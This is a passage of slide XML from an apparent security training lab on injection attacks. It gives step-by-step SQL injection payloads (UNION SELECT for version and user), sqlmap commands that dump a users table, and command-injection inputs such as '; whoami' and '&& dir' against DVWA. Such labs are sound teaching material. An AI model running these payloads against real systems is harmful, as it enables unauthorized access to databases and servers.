          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Burp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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700" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="60000"/>
                    <a:lumOff val="40000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Intruder </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0"/>
              <a:t>sends multiple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> requests </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>automatically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>response length, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0"/>
              <a:t>status </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>code, or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0"/>
              <a:t>response </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> may change for a valid</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> payload.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>This helps identify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>valid credentials or application behavior differences</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="933764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7825" y="1789113"/>
            <a:ext cx="8229600" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>TASK 02</a:t>
            </a:r>
            <a:endParaRPr b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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050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905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/>
              <a:t>Task 02: Injection Attacks</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" err="1"/>
              <a:t>SQLi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0"/>
              <a:t> &amp; Command Injection)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66675" y="1074739"/>
            <a:ext cx="8229600" cy="452596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1500" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t> Trick the database and the operating system </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" smtClean="0"/>
              <a:t>through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t>input fields. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0"/>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t>Perform a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0"/>
              <a:t>Manual SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t> to extract database version/user. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0" err="1"/>
              <a:t>SQLMap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t> to automate table and column extraction. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t>Test for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0"/>
              <a:t>OS Command Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t> using commands like ; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0" err="1"/>
              <a:t>whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t> or</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t> &amp;&amp; dir. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t> Learn why "Input Validation" is the most critical </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0"/>
              <a:t>defense. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/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3891954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4861369" cy="60413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Part1 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Step 1 — Identify a Potential Injection Point</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>capture the request in Burp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Send it to Repeater</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Find an input field or URL parameter that interacts with the database.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example URL:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com/product.php?id=1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The parameter </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>id=1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> may be used in a backend SQL query.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Send to repeater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69" y="1"/>
            <a:ext cx="4746361" cy="60413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2 — Test for SQL Injection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Modify the parameter by adding a single quote </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to check for SQL errors.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http://example.com/product.php?id=1'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Observation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If the application returns a database error such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL syntax error</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This indicates the parameter may be vulnerable to SQL Injection.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663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5447211" cy="60413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3 — Confirm Injection Using Boolean Logic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Send it to the repeater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Test with logical conditions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>True condition:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com/product.php?id=1 AND 1=1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>False condition:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com/product.php?id=1 AND 1=2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Send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Observation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>If the page behavior changes (if you get successful login or status code) → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>SQL Injection confirmed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1548" y="0"/>
            <a:ext cx="4811675" cy="6460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4 — Identify Number of Columns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Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>ORDER BY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to determine the number of columns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Inject the ORDER BY payload in the parameter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example tests:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com/product.php?id=1 ORDER BY 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com/product.php?id=1 ORDER BY 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com/product.php?id=1 ORDER BY 3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> .</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Continue increasing the number until an error occurs.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The last working number indicates the total columns.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966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5726"/>
            <a:ext cx="12192000" cy="6524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Step 5 — Use UNION to Extract Information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Once the number of columns is known, perform a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>UNION SELECT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Example (assuming 3 columns):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>http://example.com/product.php?id=1 UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>1,2,3 you can do it inside </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>the</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>search bar of the browser</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>If the numbers appear on the page, the injection is successful.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Step </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>6 — Extract Database Version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Replace one column with a database function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>http://example.com/product.php?id=1 UNION SELECT 1,version(),3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Possible output:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>MySQL 8.0.34</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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464572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8575"/>
            <a:ext cx="11129554" cy="68294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Step 7 — Extract Current Database User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Use the database user function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>http://example.com/product.php?id=1 UNION SELECT 1,user(),3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Possible output:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>root@localhost</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Expected Result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The web page displays database information such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Database Version: MySQL 8.0.34</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Current User: root@localhost</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>This confirms that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>manual SQL Injection successfully </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>retrieved </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>database information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30397204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66675"/>
            <a:ext cx="10144125" cy="6515100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Part 2 — Automating SQL Injection with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1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SQLMap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="2E74B5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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a: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 to automate database enumeration.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="1F4D78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solidFill>
                <a:srgbClr val="1F4D78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solidFill>
                  <a:srgbClr val="1F4D78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1 — Basic Scan</a:t>
            </a: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sqlmap -u "http://target-site.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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product.php?id</a:t>
            </a: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=1" --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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dbs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1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This command identifies available databases.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solidFill>
                <a:srgbClr val="1F4D78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solidFill>
                  <a:srgbClr val="1F4D78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2 — Extract Tables</a:t>
            </a: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sqlmap -u "http://target-site.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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product.php?id</a:t>
            </a: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=1" -D </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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database_name</a:t>
            </a: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--tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> 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solidFill>
                <a:srgbClr val="1F4D78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solidFill>
                  <a:srgbClr val="1F4D78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3 — Extract Columns</a:t>
            </a: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sqlmap -u "http://target-site.com/product.php?id=1" -D </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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database_name</a:t>
            </a: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-T users --columns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> 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solidFill>
                <a:srgbClr val="1F4D78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solidFill>
                  <a:srgbClr val="1F4D78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4 — Dump Data</a:t>
            </a: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sqlmap -u "http://target-site.com/product.php?id=1" -D </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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database_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="18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-T users --dump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1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This extracts stored data.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1100" dirty="0"/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1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686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"/>
            <a:ext cx="12192000" cy="6990805"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:no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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Berlin Sans FB" panose="020E06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Part 3 — OS Command Injection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smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="991793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1 — Identify Input Field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web applications provide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tools through a webpage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Ping Tool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Enter IP Address: [ 127.0.0.1 ]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 Submit ]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 the application is basically doing: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ping &lt;user_input&gt;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 appears on the webpage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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the developer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2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does not validate the input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" alt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whatever the user enters becomes part of the </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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US" alt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command.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127.0.0.1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Server runs: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ping 127.0.0.1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 smtClean="0">
              <a:solidFill>
                <a:srgbClr val="1F4D78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787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6" y="-9526"/>
            <a:ext cx="10887074" cy="70504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page:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/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 in to Damn Vulnerable Web Application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/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Navigate to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/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DVWA → Vulnerabilities → Command Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/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 will see a page like this:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/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Command Execution</a:t>
            </a:r>
            <a:b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Enter an IP address:</a:t>
            </a:r>
            <a:b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[ 127.0.0.1 ]</a:t>
            </a:r>
            <a:b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 Submit ]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 the application is basically doing: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ping &lt;user_input&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" alt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 appears on the webpage.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="19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the developer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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does not validate the input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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whatever the user enters becomes part of the </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="19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9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US" altLang="en-US" sz="19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command.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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193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155680" cy="6949440"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:no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smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="1F4D78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2 — Inject Command</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Test Normal Input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First enter a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>normal IP address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127.0.0.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Submit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You will see something like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>PING 127.0.0.1 (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>127.0.0.1)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>64 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>bytes from 127.0.0.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>This confirms the server is running a command like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>ping -c 4 127.0.0.1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 smtClean="0">
              <a:solidFill>
                <a:srgbClr val="1F4D78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 command separator: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127.0.0.1 ; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000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whoami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0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 output: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www-data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means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server is running as the user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www-data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 confirms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Command Injection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 smtClean="0">
              <a:solidFill>
                <a:srgbClr val="1F4D78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22723688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76" y="85726"/>
            <a:ext cx="11990341" cy="6772274"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:no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smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="1F4D78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3 — Test Another Command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Windows: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127.0.0.1 &amp;&amp; dir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For windows server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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Linux: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127.0.0.1 &amp;&amp; ls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0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the command output appears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Pinging 127.0.0.1 with 32 bytes of data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Reply from 127.0.0.1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Volume in drive C has no label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Directory of C:\xampp\htdocs\dvwa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index.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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endParaRPr lang="en-US" altLang="en-US" sz="20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err="1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login.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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Vulnerabilities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 smtClean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Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
